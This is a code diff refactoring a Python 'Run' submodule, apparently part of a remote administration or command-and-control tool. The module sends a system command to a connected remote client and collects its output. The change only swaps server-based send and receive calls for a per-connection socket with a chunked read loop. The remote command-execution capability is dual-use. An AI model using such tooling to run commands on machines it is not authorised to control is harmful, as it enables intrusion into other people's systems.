@@ -6,7 +6,7 @@ class Run:
     This class handles the modular functionality of sending a system command for the remote client to execute it.
     """
 
-    def __init__(self, currentSession, command):
+    def __init__(self, connection, command):
         """
         Initializes the Submodule with a name and description.
         """
@@ -14,25 +14,35 @@ class Run:
         self.name = "Run"
         self.description = "This module handles the process of executing a system command in the remote client."
 
-        self._currentSession = currentSession
+        self._connection = connection
         self._command = command
 
-    def sendCommand(self, server, client):
+    def sendCommand(self):
         """
         Sends the command to execute to the client
         """
 
         #Send command
-        server.sendTo(client, b'command' + self._command.encode())
+        self._connection.send(b'command' + self._command.encode())
 
-    def receiveOutput(self, server, client):
+    def receiveOutput(self):
         """
         Receives the stdout of the command sent
         """
 
-        data = server.recvFrom(client)
+        contents = b''
 
-        return data
+        # Get data
+        while True:
+            try:
+                chunk = self._connection.recv(1024)
+                if not chunk:
+                    break
+                contents += chunk
+            except:
+                break
+
+        return contents
 
     def execute(self):
         """
@@ -42,9 +52,9 @@ class Run:
         print(f"Executing Submodule {self.name} - {self.description}")
         server = Server.getInstance()
 
-        self.sendCommand(server, self._currentSession - 1)
+        self.sendCommand()
 
-        stdout = self.receiveOutput(server, self._currentSession - 1)
+        stdout = self.receiveOutput()
 
         return stdout.decode('utf-8')
 
